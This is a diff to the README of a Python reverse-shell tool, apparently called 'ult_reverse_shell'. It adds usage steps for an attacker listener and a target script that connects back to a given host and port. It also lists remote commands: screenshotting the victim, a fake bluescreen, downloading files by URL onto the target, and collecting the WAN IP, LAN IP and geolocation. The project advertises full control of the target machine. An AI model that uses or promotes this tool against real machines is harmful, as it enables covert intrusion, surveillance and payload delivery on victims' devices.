@@ -20,6 +20,39 @@ $ cd ult_reverse_shell
 $ pip3 install -r requirements.txt
 ```
 
+## Usage ##
+### 1. Listen for target ###
+On attacker machine, run the `attacker.py` script.
+```
+python3 attacker.py [port]
+```
+
+### 2. Execute reverse shell ###
+On target machine, run the `target.py` script.
+```
+python3 target.py [host] [port]
+```
+
+
+## Commands ##
+```sh
+# Halt
+!dc            Disconnect the target from this host, target will start reconnecting process.
+!shutdown      Shutdown both `attacher` and `target`.
+
+# Listen
+!screenshot    Screenshot the target machine.
+
+# Cheat
+!bluescreen    Fake bluescreen. (Windows Only)
+!dl            Download file by URL onto the target machine.
+
+# Information
+!wan_ip        Get the WAN IP.
+!lan_ip        Get the LAN IP.
+!geo_info      Get the geolocation on the target device.
+```
+
 
 ## Features ##
 ### Implemented ###
@@ -29,7 +62,7 @@ $ pip3 install -r requirements.txt
 * Full control on the target machine.
 
 ### Not Implemented ###
-* Packet encoder/decoder. (Not planning on it!)
+* Packet encoder/decoder.
 
 
 ## TODOs ##
